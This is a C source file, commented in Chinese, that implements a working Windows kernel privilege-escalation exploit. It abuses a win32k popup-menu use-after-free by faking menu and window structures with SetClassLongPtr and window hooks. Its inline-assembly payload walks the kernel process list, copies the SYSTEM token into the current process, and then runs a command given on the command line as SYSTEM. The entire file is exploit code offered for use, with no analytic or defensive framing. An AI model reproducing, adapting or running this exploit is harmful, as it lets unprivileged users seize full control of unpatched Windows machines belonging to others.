#include <stdio.h>
#include<stdlib.h>
#include<windows.h>

#define MN_CLOSEHIERARCHY 0x1E4
#define MN_FINDMENUWINDOWFROMPOINT 0x1EB
#define MN_SETTIMERTOOPENHIERARCHY 0x1F0
#define MN_SELECTITEM 0x1E5

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define PROCESS_LINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

typedef struct _THRDESKHEAD {
	HANDLE  h;
	DWORD   cLockObj;
	PVOID   pti;
	PVOID   rpdesk;
	PBYTE   pSelf;
} THRDESKHEAD, * PTHRDESKHEAD;

typedef PVOID(__fastcall* HMValidateHandle_t)(HANDLE, UINT);

HMValidateHandle_t HMValidateHandle = 0;

static HHOOK g_hhWndHook = 0;
static HWND g_hMenuVictim = 0;
static HWND g_hRootMenu = 0;
static HWND g_hHitMenu = 0;
static HWND g_hWndList[0x100] = { 0 };
static PDWORD g_sptagWnd = 0;

static int g_Counts = 0;
static BOOLEAN g_bIsAttacked = FALSE;

BOOLEAN Init() {
	int offset = 0;
	DWORD next_code = 0;
	for (int i = 0; i < 0x100; i++) {
		PUCHAR tr = (PUCHAR)IsMenu + i;
		if (*tr == 0xE8)
		{//找到调用HMValidateHandle的指令位置
			offset = *(int*)((PCHAR)IsMenu + i + 1);
			next_code = (DWORD)IsMenu + i + 5;
			HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
			break;
		}
	}
	if (!HMValidateHandle) {
		printf("[!]Error: Can not find HMValidateHandle!\n");
		return FALSE;
	}
	printf("[+]Found HMValidateHandle = 0x%p\n", HMValidateHandle);
	return TRUE;
}

static VOID FakePopupMenu() {
	//伪造PopupMenu数据结构
	DWORD spPopupMenu[0xD] = { 0 };
	spPopupMenu[0] = 0x66666666;
	spPopupMenu[1] = 0x66666666;
	spPopupMenu[2] = 0x66666666;
	spPopupMenu[3] = (DWORD)g_sptagWnd;//tagPOPUPMENU->spwndNextPopup
	spPopupMenu[4] = 0x66666666;
	spPopupMenu[5] = 0x66666666;
	spPopupMenu[6] = 0x66666666;
	spPopupMenu[7] = (DWORD)g_sptagWnd;//tagPOPUPMENU->spwndActivePopup
	spPopupMenu[8] = 0x66666666;
	spPopupMenu[9] = 0x66666666;
	spPopupMenu[0xA] = 0x66666666;
	spPopupMenu[0xB] = 0x66666666;
	spPopupMenu[0xC] = (DWORD)0;

	for (int i = 0; i < 0x100; i++) {
		SetClassLongPtrW(g_hWndList[i], GCL_MENUNAME, (LONG)spPopupMenu);
	}
}

static
LRESULT
WINAPI
HintMenuWindowProc(HWND   hwnd, UINT   msg, WPARAM wParam, LPARAM lParam) {

	if (msg == MN_FINDMENUWINDOWFROMPOINT) {
		printf("[+]HintMenuWindowProc: msg == MN_FINDMENUWINDOWFROMPOINT\n");
		return (LRESULT)g_hMenuVictim;
	}
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

static
VOID
CALLBACK
WindowsEventProc(
	HWINEVENTHOOK hWinEventHook,
	DWORD         event,
	HWND          hwnd,
	LONG          idObject,
	LONG          idChild,
	DWORD         idEventThread,
	DWORD         dwmsEventTime
) {
	printf("[+]Receive windows evet : EVENT_SYSTEM_MENUPOPUPSTART\n");
	switch (g_Counts)
	{
	case 0:
		g_hRootMenu = hwnd;
		printf("[+]g_hRootMenu = 0x%p\n", g_hRootMenu);
		//向根菜单发送鼠标点击消息
		SendMessageW(g_hRootMenu, WM_LBUTTONDOWN, 0, MAKELONG(5, 5));
		break;
	case 1:
		if (g_bIsAttacked)return;
		//保存此时的窗口句柄
		g_hHitMenu = hwnd;
		printf("[+]g_hHitMenu = 0x%p\n", g_hHitMenu);
		//向根菜单发送鼠标移动消息，从而进入漏洞函数
		SendMessageW(g_hRootMenu, WM_MOUSEMOVE, 0, MAKELONG(6, 6));
		break;
	}
	g_Counts++;
}

static
LRESULT
CALLBACK
WindowsHookProc(INT code, WPARAM wParam, LPARAM lParam) {
	PCWPSTRUCT spCwp = (PCWPSTRUCT)lParam;
	if (g_bIsAttacked) {
		//如果已经攻击成功就直接交由系统的处理
		return CallNextHookEx(g_hhWndHook, code, wParam, lParam);
	}
	switch (spCwp->message)
	{
	case MN_FINDMENUWINDOWFROMPOINT:
		if (spCwp->hwnd == g_hHitMenu) {
			//为此时的窗口设置一个消息处理程序
			SetWindowLongW(spCwp->hwnd, GWL_WNDPROC, (LONG)HintMenuWindowProc);
		}
		break;
	case MN_SETTIMERTOOPENHIERARCHY:
	{//触发UAF漏洞
		printf("[+]Message:MN_SETTIMERTOOPENHIERARCHY\n");
		DestroyWindow(g_hMenuVictim);
		FakePopupMenu();
		break;
	}

	}
	return CallNextHookEx(g_hhWndHook, code, wParam, lParam);
}

LRESULT WINAPI VictimMenuProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	switch (msg)
	{
	case MN_SELECTITEM:
		return (LRESULT)0x10;
	case MN_SETTIMERTOOPENHIERARCHY:
		return (LRESULT)0;
	}
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

VOID AttackPayload() {
	__asm {
		pushad; 保存堆栈状态
		xor eax, eax
		mov eax, fs: [eax + KTHREAD_OFFSET] ; 获取当前进程对象 _EPROCESS
		mov eax, [eax + EPROCESS_OFFSET]
		mov ebx, eax; ebx保存的是当前进程的_EPROCESS
		mov ecx, SYSTEM_PID

		; 开始搜索system进程的_EPROCESS
		SearchSystemPID :
		mov eax, [eax + PROCESS_LINK_OFFSET]
			sub eax, PROCESS_LINK_OFFSET
			cmp[eax + PID_OFFSET], ecx; 判断是否是system的PID
			jne SearchSystemPID

			; 如果是则开始将当前进程的TOKEN替换程system的TOKEN
			mov edx, [eax + TOKEN_OFFSET]; 取得system的TOKEN
			mov[ebx + TOKEN_OFFSET], edx; 替换当前进程的TOKEN
			popad; 恢复堆栈状态
			mov g_bIsAttacked, 1
	}
}

static DWORD WINAPI Exploit_Thread(LPVOID lParam) {
	//创建两个弹出式菜单，其中一个是MN_Normal，另一个是MN_Root
	HMENU MN_Normal = CreatePopupMenu();
	HMENU MN_Root = CreatePopupMenu();
	printf("[+]MN_Normal = 0x%p\n", MN_Normal);
	printf("[+]MN_Root = 0x%p\n", MN_Root);
	//设置菜单信息
	MENUINFO mni = { 0 };
	mni.cbSize = sizeof(MENUINFO);
	mni.fMask = MIM_STYLE;
	mni.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;
	SetMenuInfo(MN_Normal, &mni);
	SetMenuInfo(MN_Root, &mni);
	//并将MN_Normal作为MN_Root的一个菜单项
	char szMnItemName[] = "item";
	AppendMenuA(MN_Root, MF_BYPOSITION | MF_POPUP, (UINT_PTR)MN_Normal, szMnItemName);
	AppendMenuA(MN_Normal, MF_BYPOSITION | MF_POPUP, 0, szMnItemName);

	//创建一个主窗口，作为承载菜单的窗口
	WNDCLASSEXW wcs = { 0 };
	wcs.cbSize = sizeof(WNDCLASSEXW);
	wcs.lpfnWndProc = DefWindowProcW;
	wcs.cbWndExtra = 0;
	wcs.hIcon = 0;
	wcs.hbrBackground = 0;
	wcs.style = 0;
	wcs.lpszMenuName = 0;
	wcs.hInstance = GetModuleHandleA(0);
	ATOM atom = 0;
	//创建0x100个窗口，为UAF做准备
	for (int i = 0; i < 0x100; ) {
		atom = 0;
		WCHAR wzClsName[20];
		wsprintfW(wzClsName, L"%d", ((i + 1) * 1998));
		wcs.lpszClassName = wzClsName;
		atom = RegisterClassExW(&wcs);
		if (!atom)continue;
		HWND hTmp = 0;
		hTmp = CreateWindowExW(0, (LPCWSTR)atom, NULL, WS_OVERLAPPED,
			0,
			0,
			0,
			0,
			NULL,
			NULL,
			GetModuleHandleA(NULL),
			NULL);
		if (!hTmp)continue;

		g_hWndList[i++] = hTmp;
	}
	atom = 0;
	wcs.lpszClassName = L"Main";
	wcs.hInstance = GetModuleHandleA(NULL);
	wcs.lpszMenuName = NULL;
	atom = RegisterClassExW(&wcs);
	if (!atom) {
		printf("[+]Error:%d\n", __LINE__ - 2);
		return 0;
	}

	HWND hWndMain = CreateWindowExW(
		WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,//工具栏窗口
		(LPCWSTR)atom,
		NULL,
		WS_VISIBLE,
		0,
		0,
		1,
		1,
		NULL,
		NULL,
		GetModuleHandleA(0),
		NULL
	);
	if (!hWndMain) {
		printf("[!]Error:%d\n", __LINE__ - 15);
		return 0;
	}

	//自定义一个菜单，该菜单将用于漏洞利用
	g_hMenuVictim = CreateWindowExW(
		WS_EX_TOOLWINDOW | WS_EX_DLGMODALFRAME | WS_EX_WINDOWEDGE,
		L"#32768",
		NULL,
		WS_POPUP | WS_BORDER,
		0,
		0,
		1,
		1,
		0,
		0,
		0,
		0
	);
	printf("[+]g_hMenuVictim = 0x%p\n", g_hMenuVictim);
	//为g_hMenuVictim设置一个窗口处理程序
	SetWindowLongW(g_hMenuVictim, GWL_WNDPROC, (LONG)VictimMenuProc);

	((PTHRDESKHEAD)g_sptagWnd)->pti = ((PTHRDESKHEAD)HMValidateHandle(g_hMenuVictim, 1))->pti;

	//设置消息钩子
	g_hhWndHook = SetWindowsHookExW(WH_CALLWNDPROC, WindowsHookProc, GetModuleHandleA(0), GetCurrentThreadId());
	//设置事件钩子程序
	SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
		GetModuleHandleA(NULL),
		WindowsEventProc,
		GetCurrentProcessId(),
		GetCurrentThreadId(),
		0);

	TrackPopupMenuEx(MN_Root, 0, 0, 0, hWndMain, NULL);

	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0) && !g_bIsAttacked)
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	return 1;//SUCCESS
}

int main(int argc, char** argv)
{
	if (!Init()) {
		printf("[!]Error:%d\n", __LINE__ - 1);
		return 0;
	}
	//分配内存，用来伪造tagWND数据结构
	g_sptagWnd = (PDWORD)LocalAlloc(LMEM_ZEROINIT, 0x100);
	if (!g_sptagWnd) {
		printf("[!]Error:%d\n", __LINE__ - 2);
		return 0;
	}
	g_sptagWnd[5] = 0x40000;//Has Menu
	g_sptagWnd[0x18] = (DWORD)AttackPayload;

	//创建一个攻击线程
	HANDLE hThreadAttack = CreateThread(0, 0, Exploit_Thread, 0, 0, 0);
	if (!hThreadAttack) {
		printf("[!]Error:%d\n", __LINE__ - 2);
		return 0;
	}
	WaitForSingleObject(hThreadAttack, INFINITE);

	if (g_bIsAttacked) {
		printf("\n\n[*]Try execute %s as SYSTEM!\n", argv[1]);
		system(argv[1]);
	}
	else {
		printf("[!]Error:Attack failed!\n");
	}
	CloseHandle(hThreadAttack);
	return 0;
}
